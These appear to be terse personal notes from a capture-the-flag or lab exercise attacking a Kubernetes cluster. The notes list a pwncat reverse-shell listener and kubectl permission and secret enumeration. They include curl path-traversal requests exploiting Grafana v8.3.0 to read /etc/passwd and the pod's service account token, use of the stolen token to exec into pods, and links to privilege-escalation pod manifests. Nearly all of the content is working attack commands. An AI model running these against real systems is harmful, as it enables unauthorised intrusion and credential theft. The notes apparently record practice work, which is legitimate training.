```
sudo openvpn geowarin.ovpn
ip addr
https://www.revshells.com/
python -m pwncat -lp 8888

upload kubectl
./kubectl auth can-i --list
./kubectl get secret secretflag -o json

curl graphana:3000/login
Grafana v8.3.0-beta2

https://www.exploit-db.com/exploits/50581

curl --path-as-is http://grafana:3000/public/plugins/logs/../../../../../../../../../etc/passwd

/var/run/secrets/kubernetes.io/serviceaccount/token
curl --path-as-is http://grafana:3000/public/plugins/logs/../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token

export TOKEN=...
./kubectl --token=$TOKEN get pods

./kubectl --token=$TOKEN exec -it grafana-... -- /bin/bash
```

https://bishopfox.com/blog/kubernetes-pod-privilege-escalation

https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml


https://kubernetes.io/docs/tasks/access-application-cluster/list-all-running-container-images/

image: syringe:latest
imagePullPolicy: IfNotPresent

